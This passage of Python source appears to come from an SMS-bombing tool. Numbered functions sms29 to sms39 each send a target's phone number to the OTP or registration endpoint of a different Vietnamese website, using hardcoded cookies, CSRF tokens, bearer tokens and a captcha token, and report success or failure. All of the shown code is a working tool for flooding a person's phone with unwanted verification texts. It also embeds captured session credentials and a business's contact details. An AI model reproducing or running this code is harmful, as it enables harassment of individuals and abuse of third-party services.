        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'type': 'register',
    }

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
    if 'true' in response.text:
        print(format_print("*", "sms29: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms29: THẤT BẠI!"))   


def sms30(phone):
    cookies = {
        '_gcl_au': '1.1.612062991.1693832247',
        '_ga': 'GA1.2.2100968570.1693832247',
        '_gid': 'GA1.2.823438155.1693832247',
        '_tt_enable_cookie': '1',
        '_ttp': '8QojcD2E-4ZWQyk38eZM5QTGEw2',
        '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfv24E3RhNn0Gzh_ZfI8o8Wz_70E5dmeH7esZnGk3kfpDoYl0nqfmWCM_bYhqeky2NpCvnsTzzuXkhQkM4j09nkqPhBnh1uMPP21hU9AV3mD3T8lmMRWX12116_xJvTbus',
        '.Nop.Customer': 'ba54ce0a-13e1-453c-8363-88bf017b8dcf',
        '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMc3b9L6dS2K_oLOoyagdN1aldzaP3FtbjTZaRpraxoLyzli6tkONSWN-v0l1iigLI3u1FBkohAWQUURHDTENd1iCBv_bPKzmveLCo6E85w0E0PwkXLwDRiNyXvpU2-ffdmp97k0oVyXxa9RccWGi_uxVLdRep6tdHrKuPdgP06w7g',
    }

    headers = {
        'authority': 'thepizzacompany.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.612062991.1693832247; _ga=GA1.2.2100968570.1693832247; _gid=GA1.2.823438155.1693832247; _tt_enable_cookie=1; _ttp=8QojcD2E-4ZWQyk38eZM5QTGEw2; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfv24E3RhNn0Gzh_ZfI8o8Wz_70E5dmeH7esZnGk3kfpDoYl0nqfmWCM_bYhqeky2NpCvnsTzzuXkhQkM4j09nkqPhBnh1uMPP21hU9AV3mD3T8lmMRWX12116_xJvTbus; .Nop.Customer=ba54ce0a-13e1-453c-8363-88bf017b8dcf; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMc3b9L6dS2K_oLOoyagdN1aldzaP3FtbjTZaRpraxoLyzli6tkONSWN-v0l1iigLI3u1FBkohAWQUURHDTENd1iCBv_bPKzmveLCo6E85w0E0PwkXLwDRiNyXvpU2-ffdmp97k0oVyXxa9RccWGi_uxVLdRep6tdHrKuPdgP06w7g',
        'dnt': '1',
        'origin': 'https://thepizzacompany.vn',
        'referer': 'https://thepizzacompany.vn/Otp',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdA6eKbtod3RRZhW0oMAbjY51WN7NObT74BSrixWfCNutY-oIWf45xqyHeDAqa6uoqs1jgc1YTZb9K75G_VbjoHC5Tpa6zerOu5KrKhCjOuHPKVnuUfgka_VUVi1RwMXbg',
    }

    response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data)
    if 'true' in response.text:
        print(format_print("*", "sms30: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms30: THẤT BẠI!"))   
        
        
def sms31(phone):
    cookies = {
        '_gcl_au': '1.1.621175732.1703862038',
        '_ga': 'GA1.1.1365287929.1703862041',
        '_tt_enable_cookie': '1',
        '_ttp': 'ND5eC2lhZd7Sracvqbh-Nlb6Ioa',
        '_fbp': 'fb.1.1703862042460.762032013',
        'ubo_trade': '%7B%22code%22%3A%22101019000%22%2C%22name%22%3A%22H%C3%A0%20N%E1%BB%99i%22%2C%22email%22%3A%22info%40ubofood.com%22%2C%22phone_number%22%3A%220344350998%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%221%22%2C%22name%22%3A%22Mi%E1%BB%81n%20B%E1%BA%AFc%22%7D%2C%22city%22%3A%7B%22code%22%3A%2201%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%C3%A0%20N%E1%BB%99i%22%7D%2C%22district%22%3A%7B%22code%22%3A%22019%22%2C%22name%22%3A%22Qu%E1%BA%ADn%20Nam%20T%E1%BB%AB%20Li%C3%AAm%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2200637%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20Trung%20V%C4%83n%22%7D%2C%22text%22%3A%22CT1A%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A20.995577269420178%2C%22lng%22%3A105.77924502563441%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-07-05T15%3A16%3A56.5Z%22%2C%22updated_at%22%3A%222023-02-21T06%3A51%3A36.733Z%22%2C%22updated_by%22%3A%22admin%22%2C%22default_pos_code%22%3A%2200616002%22%7D',
        'ubo_token': 'Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzUzOTgwNTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.Yo_06mV-TRA1bUKZAcltCC-QzaV231uwfsVZHpBlxYDqfNrz5_PVXhEBvRCS2CGb5pBH1pN5t_XJqHQtb7xCASn7U472sf3CYdz0Fq-GkxqSksphrVTYqFUMaxVZolzfYr8ZF28rWbDb64ORnEWAf8nFiKM5KlilnVSHcb3vUWtijk1nAE_kMi_3vYlPChvv7FWecDKSZPJeszKnaI3KJzUIRouY0rPWnE_CWJyxblc6UC6c7aMAve6F4KrFzs8wcQTfoem5kpwlg3m4tyLluBIdRSjTlEA4H0k2xL2vmx5odR7IczPpLz-wGpgPSg_5-9Lk4XPAlpz1Q3833KIpXmbKs_rKowLhG8pXH2c_EARzRarDm6Yu0NM4rVQwNHjdHgLUnGTvKi6oPTJ8RWrx5H0mjc0UY15JlxnjCxmq_Z8k4cleFRDvL05LmQovbY5PTiu3Oi5o7BOJUp55AgpbgLTj1M9kW3EyvDwAdUetwYr0qixoTNumiD1DB4Mpha2coGSxse_10ch0J4fFZosuGfqXDHYaITL1FaoEfyVrBDWS2rVZ00llVZQXqBrvk9nEHaWiGzvZGPZRm9G3HJOEKESp99CPkBYCq31b-n8JGwnHNXzfxdT9SE82mAdu5ckZX4x33rYnUUhr6nHqmycysna5Lwickph03Chq88mPyXQ',
        '_ga_KCGG79N4SY': 'GS1.1.1703862040.1.1.1703862075.0.0.0',
        '_ga_3PKTQRQF3P': 'GS1.1.1703862040.1.1.1703862078.22.0.0',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzUzOTgwNTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.Yo_06mV-TRA1bUKZAcltCC-QzaV231uwfsVZHpBlxYDqfNrz5_PVXhEBvRCS2CGb5pBH1pN5t_XJqHQtb7xCASn7U472sf3CYdz0Fq-GkxqSksphrVTYqFUMaxVZolzfYr8ZF28rWbDb64ORnEWAf8nFiKM5KlilnVSHcb3vUWtijk1nAE_kMi_3vYlPChvv7FWecDKSZPJeszKnaI3KJzUIRouY0rPWnE_CWJyxblc6UC6c7aMAve6F4KrFzs8wcQTfoem5kpwlg3m4tyLluBIdRSjTlEA4H0k2xL2vmx5odR7IczPpLz-wGpgPSg_5-9Lk4XPAlpz1Q3833KIpXmbKs_rKowLhG8pXH2c_EARzRarDm6Yu0NM4rVQwNHjdHgLUnGTvKi6oPTJ8RWrx5H0mjc0UY15JlxnjCxmq_Z8k4cleFRDvL05LmQovbY5PTiu3Oi5o7BOJUp55AgpbgLTj1M9kW3EyvDwAdUetwYr0qixoTNumiD1DB4Mpha2coGSxse_10ch0J4fFZosuGfqXDHYaITL1FaoEfyVrBDWS2rVZ00llVZQXqBrvk9nEHaWiGzvZGPZRm9G3HJOEKESp99CPkBYCq31b-n8JGwnHNXzfxdT9SE82mAdu5ckZX4x33rYnUUhr6nHqmycysna5Lwickph03Chq88mPyXQ',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json; charset=UTF-8',
        # 'Cookie': '_gcl_au=1.1.621175732.1703862038; _ga=GA1.1.1365287929.1703862041; _tt_enable_cookie=1; _ttp=ND5eC2lhZd7Sracvqbh-Nlb6Ioa; _fbp=fb.1.1703862042460.762032013; ubo_trade=%7B%22code%22%3A%22101019000%22%2C%22name%22%3A%22H%C3%A0%20N%E1%BB%99i%22%2C%22email%22%3A%22info%40ubofood.com%22%2C%22phone_number%22%3A%220344350998%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%221%22%2C%22name%22%3A%22Mi%E1%BB%81n%20B%E1%BA%AFc%22%7D%2C%22city%22%3A%7B%22code%22%3A%2201%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%C3%A0%20N%E1%BB%99i%22%7D%2C%22district%22%3A%7B%22code%22%3A%22019%22%2C%22name%22%3A%22Qu%E1%BA%ADn%20Nam%20T%E1%BB%AB%20Li%C3%AAm%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2200637%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20Trung%20V%C4%83n%22%7D%2C%22text%22%3A%22CT1A%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A20.995577269420178%2C%22lng%22%3A105.77924502563441%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-07-05T15%3A16%3A56.5Z%22%2C%22updated_at%22%3A%222023-02-21T06%3A51%3A36.733Z%22%2C%22updated_by%22%3A%22admin%22%2C%22default_pos_code%22%3A%2200616002%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzUzOTgwNTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.Yo_06mV-TRA1bUKZAcltCC-QzaV231uwfsVZHpBlxYDqfNrz5_PVXhEBvRCS2CGb5pBH1pN5t_XJqHQtb7xCASn7U472sf3CYdz0Fq-GkxqSksphrVTYqFUMaxVZolzfYr8ZF28rWbDb64ORnEWAf8nFiKM5KlilnVSHcb3vUWtijk1nAE_kMi_3vYlPChvv7FWecDKSZPJeszKnaI3KJzUIRouY0rPWnE_CWJyxblc6UC6c7aMAve6F4KrFzs8wcQTfoem5kpwlg3m4tyLluBIdRSjTlEA4H0k2xL2vmx5odR7IczPpLz-wGpgPSg_5-9Lk4XPAlpz1Q3833KIpXmbKs_rKowLhG8pXH2c_EARzRarDm6Yu0NM4rVQwNHjdHgLUnGTvKi6oPTJ8RWrx5H0mjc0UY15JlxnjCxmq_Z8k4cleFRDvL05LmQovbY5PTiu3Oi5o7BOJUp55AgpbgLTj1M9kW3EyvDwAdUetwYr0qixoTNumiD1DB4Mpha2coGSxse_10ch0J4fFZosuGfqXDHYaITL1FaoEfyVrBDWS2rVZ00llVZQXqBrvk9nEHaWiGzvZGPZRm9G3HJOEKESp99CPkBYCq31b-n8JGwnHNXzfxdT9SE82mAdu5ckZX4x33rYnUUhr6nHqmycysna5Lwickph03Chq88mPyXQ; _ga_KCGG79N4SY=GS1.1.1703862040.1.1.1703862075.0.0.0; _ga_3PKTQRQF3P=GS1.1.1703862040.1.1.1703862078.22.0.0',
        'DNT': '1',
        'Origin': 'https://ubofood.com',
        'Referer': 'https://ubofood.com/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone_number': phone,
        'trade_code': '101019000',
        'captcha': '03AFcWeA57DLZ2vpQbBNFdhiRbVl9Tl7LLgZNidOGidwem9Qe35fs7vriYjyeNbAHMucJqqubWkbk3utAUXx4-qrLh-ua7cURkFSvCbwjHP-5c8JzP8X8SYo9pTUGqpvBzMhidETa3Z8VDrHiiIfqmsYmEDqxnboFGMQx5CB44u8UxKmqg2egTmd2FGbYheVmTEPUUMZhP84u8T0N_R8_ybq2_2KhyvBETIX2iZni8vRSjl0osIeZ3GAqrq9goXdsml2AEi5s9HfHvktW00l5xvaNvt4FT-AHcqML0jvq-y95-J7sPzjjZRHpKD1q0Mw9NvGR_iFe6DkKpuuM83OjgWVRW2JxCRDE2FKZQ3p7Z0qIV4NqaxlJdTl6lE0RRqXnUAZiEkN0Rm4sSPhD4JkUYJPkAbDMp9FcVb_23bMBDkFtw7jmVaD6FxLFMC99Yl6xR6AUMp3ECYVHeuGV6zchUydZp3aTQAYgIFAipAUGym3eIRuaeq0TfxIzcRNMAtgkYMrwyVFrT46aMYDhQqScFUQvTRve0tpBcmgIwjyb9893ThF54reVSqAHyYoAHPcEUnXJqxvl3onmNehC_qzdNCN6jX9IKKDsvZA',
    }

    response = requests.post('https://ubofood.com/auth/register', cookies=cookies, headers=headers, json=json_data)
    if 'true' in response.text:
        print(format_print("*", "sms31: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms31: THẤT BẠI!"))   
        
        
def sms32(phone):
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'DNT': '1',
        'Origin': 'https://www.tiencash.com',
        'Referer': 'https://www.tiencash.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'deviceInfo': '{"operationSys":"","channel":null,"isMobile":"0","navigatorInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","screenHeight":768,"screenWidth":1366}',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'token': 'null',
    }

    data = {
        'phone': phone,
        'sign': '67d44dda-b29f-48a4-9830-67121bc618f8',
    }
    response = requests.post('https://api.tiencash.com/v1/verify/sms/send', headers=headers, data=data)
    
    
def sms33(phone):
    cookies = {
        '_cfuvid': '_0Whbo9vhBgRfrX3KU.0_Em.3JNUy5p8NFpTsv0g07g-1703862344968-0-604800000',
        '_gcl_au': '1.1.1302306825.1703862353',
        'ctfp': 'af0b5e10-f911-435d-8219-ea319f569cad',
        'showInsertAdOnboarding': 'true',
        'cf_clearance': '7PVCE6rX6Mz9UV9bIHmL7EeNGtGWPPwv2rzp1SjXN6A-1703862357-0-2-9d5da78d.b957bcb1.ca5cf86d-0.2.1703862357',
        '_gid': 'GA1.2.754189873.1703862358',
        '_gat_UA-54934741-3': '1',
        '_fbp': 'fb.1.1703862360800.11155083',
        '_ga': 'GA1.2.1777081749.1703862358',
        'FCNEC': '%5B%5B%22AKsRol_ciqRB1xZluibXdogEf1wY5NcwxTUVCV7gL3lzzI9H-0Rhja7YDAYJfKgXp5X4qNLUwb8vJPDpeF2wEuL1JCy-m60XTJVGptiz0SrQcoDCG_l_tX-ybKmaGLZZI1WzHQMUGlCS6wErdDh02FYLFpvBJjSKQg%3D%3D%22%5D%5D',
        '_ga_XQVN5K27XX': 'GS1.1.1703862358.1.1.1703862387.31.0.0',
    }

    headers = {
        'authority': 'id.chotot.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'baggage': 'sentry-environment=prod,sentry-release=ct-web-chotot-id%402.0.0,sentry-transaction=%2Fregister%2Fotp,sentry-public_key=a0cf9ad72b214ec5a3264cec648ff179,sentry-trace_id=3bb6c23624f34a47bb017aa52ab0241a,sentry-sample_rate=0.1',
        # 'cookie': '_cfuvid=_0Whbo9vhBgRfrX3KU.0_Em.3JNUy5p8NFpTsv0g07g-1703862344968-0-604800000; _gcl_au=1.1.1302306825.1703862353; ctfp=af0b5e10-f911-435d-8219-ea319f569cad; showInsertAdOnboarding=true; cf_clearance=7PVCE6rX6Mz9UV9bIHmL7EeNGtGWPPwv2rzp1SjXN6A-1703862357-0-2-9d5da78d.b957bcb1.ca5cf86d-0.2.1703862357; _gid=GA1.2.754189873.1703862358; _gat_UA-54934741-3=1; _fbp=fb.1.1703862360800.11155083; _ga=GA1.2.1777081749.1703862358; FCNEC=%5B%5B%22AKsRol_ciqRB1xZluibXdogEf1wY5NcwxTUVCV7gL3lzzI9H-0Rhja7YDAYJfKgXp5X4qNLUwb8vJPDpeF2wEuL1JCy-m60XTJVGptiz0SrQcoDCG_l_tX-ybKmaGLZZI1WzHQMUGlCS6wErdDh02FYLFpvBJjSKQg%3D%3D%22%5D%5D; _ga_XQVN5K27XX=GS1.1.1703862358.1.1.1703862387.31.0.0',
        'dnt': '1',
        'referer': 'https://id.chotot.com/register',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sentry-trace': '3bb6c23624f34a47bb017aa52ab0241a-83bbc78ff51d14b7-0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-nextjs-data': '1',
    }

    params = {
        'phone': phone,
    }

    response = requests.get(
        'https://id.chotot.com/_next/data/FbXG9nuM-6zJwYIP9V0dP/register/otp.json',
        params=params,
        cookies=cookies,
        headers=headers,
    )
    print(format_print("*", "sms33: THÀNH CÔNG!"))
    
    
def sms34(phone):
    headers = {
        'Host': 'api.cashbar.tech',
        # 'content-length': '40',
        'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://h5.cashbar.tech',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://h5.cashbar.tech/',
        # 'accept-encoding': 'gzip, deflate',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = {
        'phone': phone,
        'type': '2',
        'ctype': '1',
        'chntoken': '',
    }

    response = requests.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', headers=headers, data=data)
    print(format_print("*", "sms34: THÀNH CÔNG!"))
    
    
def sms35(phone):
    link = 'https://www.sapo.vn/fnb/checkphonenumber?phonenumber='+phone
    response = requests.post(link)
    print(format_print("*", "sms35: THÀNH CÔNG!"))
    
    
def sms36(phone):
    link=  'https://topenland.com/_next/data/VL6b140TPQ9AMHJ2DqgBU/vi/sign-up/verify-otp.json?phoneNumber='+phone
    requests.post(link)
    print(format_print("*", "sms36: THÀNH CÔNG!"))
    
    
def sms37(phone):
    Headers = {"Host": "nhadat.cafeland.vn","content-length": "65","accept": "application/json, text/javascript, */*; q\u003d0.01","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://nhadat.cafeland.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://nhadat.cafeland.vn/dang-ky.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "laravel_session\u003deyJpdiI6IkhyUE8yblwvVFA1Um9KZnQ3K0syalZ3PT0iLCJ2YWx1ZSI6IlZkaG1mb3JpTUtsdjVOT3dSa0RNUFhWeDBsT21QWlcra2J5bFNzT1Q5RHdQYm83UVR4em1hNUNUN0ZFYTlIeUwiLCJtYWMiOiJiYzg4ZmU2ZWY3ZTFiMmM4MzE3NWVhYjFiZGUxMDYzNjRjZWE2MjkwYjcwOTdkMDdhMGU0OWI0MzJkNmFiOTg2In0%3D"}
    Payload = {"mobile": phone,"_token": "bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w",}
    response = requests.post("https://nhadat.cafeland.vn/member-send-otp/", data=Payload, headers=Headers)
    
    
def sms38(phone):
  def random_string(length):
      characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
      result = ""
      for _ in range(length):
          result += random.choice(characters)
      return result
  alo=random_string(8)
  ten=random_string(4)
  phone = '0' + phone
  phone = phone.replace('00','')
  phone12 = '+84' + phone
  cookies = {'ads': 'www.google.com','refcode': '746','time_referer': '1689061704','kvas-uuid': '3a85af4a-1908-48f2-980d-d15395992de5','kvas-uuid-d': '1686469706132','gkvas-uuid': 'fc23dc65-4af3-4711-8198-90a46e6b0ca1','gkvas-uuid-d': '1686469706134','kv-session': '94e736d4-493e-4656-9a6a-266817374182','_hjFirstSeen': '1','_hjIncludedInSessionSample_563959': '1','_hjSession_563959': 'eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==','_gid': 'GA1.2.1638977009.1686469708','_tt_enable_cookie': '1','_ttp': 'KrXyjN8UQfZPEg6udl4pOmk7Tnd','_gac_UA-158809353-1': '1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE','_gac_UA-64814867-1': '1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE','source_referer': '%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D','kv-session-d': '1686469712238','_hjSessionUser_563959': 'eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==','parent': '77','_ga': 'GA1.2.1398574114.1686469708','_ga_6HE3N545ZW': 'GS1.1.1686469708.1.1.1686469715.53.0.0','_fw_crm_v': '4721c26b-683b-4e2b-dbb2-62e4d7a8e93d',}
  headers = {'authority': 'www.kiotviet.vn','accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','dnt': '1','origin': 'https://www.kiotviet.vn','referer': 'https://www.kiotviet.vn/dang-ky/?refcode=746','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
  data = {'phone': phone12,'code': alo,'name': 'lê van sang','email': '','zone': 'An Giang - Huyện Châu Phú','merchant': 'muabansi','username': phone,'industry': 'Thời trang','ref_code': '746','industry_id': '77','phone_input': phone,}
  response = requests.post('https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',cookies=cookies,headers=headers,data=data,)
  if 'success' in response.text:
    print(format_print("*", "sms38: THÀNH CÔNG!"))
  else:
    print(format_print("x", "sms38: THẤT BẠI!"))   
    
    
def sms39(phone):
    cookies = {
        '_csrf': '973eca1396514e55d251748b39039603b1974232a85e242bfc08063f1c789d2fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22IKtajFXbRCbbHEdh_tLbQ4g1lmiP07IS%22%3B%7D',
        '_gcl_au': '1.1.1635282769.1685511240',
        '_gid': 'GA1.2.147827434.1685511243',
        '_gac_UA-53976512-2': '1.1685511243.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
        '_gat_gtag_UA_53976512_2': '1',
        '_dc_gtm_UA-53976512-2': '1',
        'vid': '1468653',
        '_gcl_aw': 'GCL.1685511244.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
        '_ga': 'GA1.1.1662212097.1685511243',
        'amp_6e403e': 'jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4p61l.1h1o4pa8v.0.2.2',
        '_ga_D022K7SJPP': 'GS1.1.1685511244.1.1.1685511263.41.0.0',
    }

    headers = {
        'authority': 'www.nhaphang247.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         'cookie': '_csrf=973eca1396514e55d251748b39039603b1974232a85e242bfc08063f1c789d2fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22IKtajFXbRCbbHEdh_tLbQ4g1lmiP07IS%22%3B%7D; _gcl_au=1.1.1635282769.1685511240; _gid=GA1.2.147827434.1685511243; _gac_UA-53976512-2=1.1685511243.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE; _gat_gtag_UA_53976512_2=1; _dc_gtm_UA-53976512-2=1; vid=1468653; _gcl_aw=GCL.1685511244.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE; _ga=GA1.1.1662212097.1685511243; amp_6e403e=jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4p61l.1h1o4pa8v.0.2.2; _ga_D022K7SJPP=GS1.1.1685511244.1.1.1685511263.41.0.0',
        'dnt': '1',
        'origin': 'https://www.nhaphang247.com',
